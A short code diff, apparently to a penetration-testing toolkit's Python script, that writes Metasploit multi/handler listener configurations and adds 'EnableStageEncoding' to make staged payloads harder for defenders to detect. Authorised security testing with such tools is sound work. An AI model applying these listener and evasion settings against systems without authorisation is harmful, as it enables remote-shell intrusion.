@@ -419,7 +419,7 @@ try:
                                 filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (choice9,shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9,shellcode_port))
                                     filewrite.close()
 
                             if validate_ip(choice2) == False:
@@ -670,6 +670,7 @@ try:
                     if flag == 0:
                         filewrite.write("set LPORT "+choice3+"\n")
 
+                    filewrite.write("set EnableStageEncoding true\n")
                     filewrite.write("set ExitOnSession false\n")
 
                     if auto_migrate == "ON":
